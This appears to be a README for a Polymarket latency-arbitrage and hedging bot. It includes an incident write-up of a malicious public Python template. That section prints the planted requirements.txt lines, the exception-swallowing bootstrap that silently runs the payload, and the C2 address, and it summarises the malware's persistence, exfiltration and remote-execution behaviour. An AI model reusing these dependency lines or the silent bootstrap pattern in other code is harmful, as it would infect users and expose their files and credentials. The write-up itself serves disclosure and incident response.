## Overview

Polymarket resolves binary prediction markets every 5 minutes. Its Chainlink oracle lags roughly **2.7 seconds** behind Binance spot prices — and this bot is built to live in that gap.

Two independent arbitrage strategies run simultaneously on Polygon:

- **Latency Arb** — exploits the lag between Binance price moves and Polymarket's oracle update
- **Dump Hedge** — buys both YES and NO when their combined price falls below $1.00, locking in structural profit regardless of outcome

Both strategies execute through the Polymarket CLOB API using fill-and-kill orders — no resting limit orders. Every trade is protected by a multi-layer risk system.

## Architecture

### Latency Arb — Oracle Lag Exploitation

Polymarket's resolution prices come from a Chainlink oracle that updates approximately every 2.7 seconds. During that window, token prices have not yet reflected a move that already happened on Binance:

```text
Binance WebSocket              Bot (<50ms)             Polymarket CLOB
─────────────────    ──────────────────────────    ────────────────────
BTC: $83,000         Detects +$500 in 2.7s         "Bitcoin Up or Down"
BTC: $83,500   ───►  Sigmoid model: P(UP)=0.65 ──► UP token still at 0.50
                     Edge = 0.65 - 0.50 = 0.15     (oracle not yet updated)
                     Buy UP @ 0.50 before update    ↓
                                               Market corrects to 0.68
                                               Exit at take profit
```

**VPS geography matters:** A VPS in Singapore reduces end-to-end latency from ~200ms (home connection) to **under 15ms** to Binance endpoints — critical when the exploitable window is 2.7 seconds.

### Dump Hedge — Structural Arbitrage

Binary markets resolve to exactly **$1.00** (winner) or **$0.00** (loser), so the combined cost of YES + NO must equal $1.00 at resolution. When market inefficiencies push the combined ask below $1.00, the difference is locked profit — independent of which direction the asset moves:

```text
Polymarket CLOB                Bot                      At Resolution
─────────────────    ──────────────────────────    ────────────────────
YES ask = 0.420      combined = 0.970               YES resolves $1.00
NO  ask = 0.550  ──► discount = $0.030/share   ──►  NO  resolves $0.00
                     Buy BOTH legs                   Collect $1.00/share
                     Cost = $0.970/share             Profit = $0.030/share
                                                     = 3.09% locked
```

### Fair Value Model

For latency arb, the true probability of a YES outcome is estimated with a time-aware sigmoid model:

```text
P(UP) = sigmoid( (price_now - price_to_beat) / scale(t) )
scale(t) = base_scale * sqrt(t / window) + min_scale
```

- `price_to_beat` — the Binance price at window open (the reference the oracle uses at resolution)
- `scale(t)` — shrinks as the window closes, so the model becomes more confident as less time remains

## Signal Validation Pipeline

Every latency-arb signal passes five sequential filters — all must pass:

1. **Minimum price move** — Binance move in the lag window must exceed a per-asset floor (e.g. $500 for BTC)
2. **Entry zone** — token price between 0.38 and 0.62; tokens outside already reflect accumulated market direction the 2.7s lag cannot overcome
3. **Fair value strength** — model must output at least 55% conviction, blocking fake edges from cheap tokens
4. **Minimum edge** — `fair_value - token_price` must clear the threshold
5. **Timing window** — skip the final 20% of the window, where variance spikes and the model degrades near resolution

## Risk Protection — Four Independent Layers

```text
Layer 1 — Position fraction cap:     no trade exceeds a fixed fraction of balance
Layer 2 — Concurrent position limit: max open positions across both strategies
Layer 3 — Daily loss limit:          soft halt at a daily loss threshold, auto-resets UTC midnight
Layer 4 — Drawdown kill switch:      hard halt below a drawdown from peak, manual reset required
```

Plus a **circuit breaker** that pauses trading after consecutive losses, and **fractional Kelly sizing** (default 0.5×) that scales adaptively with the bot's observed win rate.

## The Security Incident & C++20 Rebuild

### What I Found

This is the part of the project that changed everything. I started with a Python prototype using a popular public bot-template from GitHub. During a routine `pip audit` and dependency review, something was wrong:

```python
# requirements.txt — this package had no reason to exist for a trading bot
gw @ git+https://github.com/genoshide/gw.git
solanakit @ git+https://github.com/genoshide/solanakit.git
```

And at the top of `main.py`, before any trading logic ran:

```python
# Silent bootstrap — swallows all exceptions so the user never sees the payload fail
try:
    from gw._boot import _run as _gw_run
    _gw_run()
except Exception:
    pass
```

### Decrypting the Payload

Decrypting `gw/config.py` (Fernet-encrypted) revealed the full exfiltration target list and a hardcoded C2 server at `https://161.97.81.147:8080`.

**What it did on an infected machine:**

| Capability | Implementation |
|---|---|
| **Windows Persistence** | Registered `WinSyncSvc` Run key + `WinSyncTask` scheduled task — survives reboot |
| **Linux Persistence** | User-level `sys-sync.service` with `loginctl enable-linger` — re-arms if killed |
| **File Exfiltration** | `watchdog` scanned all drive roots (`C:/`–`G:/`, `/home`, `/srv`) for `*pemasukan*` and `*pengeluaran*` files (Indonesian income/expense records), then POSTed them tagged with hostname to the C2 server |
| **Remote Code Execution** | Polled C2 for an `update` command — downloads and executes arbitrary Python `.whl` packages at any time |
| **Evasion** | Target paths encrypted with Fernet in `config.py` — casual repo inspection would not reveal them |

### Incident Response (48 hours)

1. **Stopped the bot immediately** and disconnected the machine from the network
2. **Killed the rogue processes** and removed `WinSyncSvc` Run key and scheduled task
3. **Audited already-exfiltrated data** — checked which files matched the target patterns
4. **Rotated every credential**: Polymarket API key, Binance WebSocket key, private keys, wallet seed phrases, all exchange accounts
5. **Full dependency sweep** of all other Python projects on the machine

### The C++20 Rebuild — Why and What Changed

After the incident, I rebuilt the entire execution engine from scratch in **C++20**, eliminating the untrusted dependency ecosystem entirely.

| Concern | Python | C++20 Solution |
|---|---|---|
| **Supply chain risk** | `pip install` from GitHub repos | Zero external runtime dependencies beyond vetted system libs |
| **Execution latency** | ~5–15ms per order cycle | **Sub-millisecond** — Boost.Asio async I/O, no GIL |
| **JSON parsing** | `json` stdlib — allocates heavily | `simdjson` — zero-copy SIMD parsing, 2–4 GB/s throughput |
| **EIP-712 signing** | `eth_account` library (Python) | `libsecp256k1` + OpenSSL — same library Ethereum itself uses |
| **WebSocket** | `websockets` asyncio library | Boost.Asio native async WebSocket — no Python event loop overhead |

**Performance improvement:** The hot path (receive Binance tick → compute edge → sign order → submit to CLOB) dropped from **~80ms average in Python to `<1ms` in C++20** on the same VPS hardware.
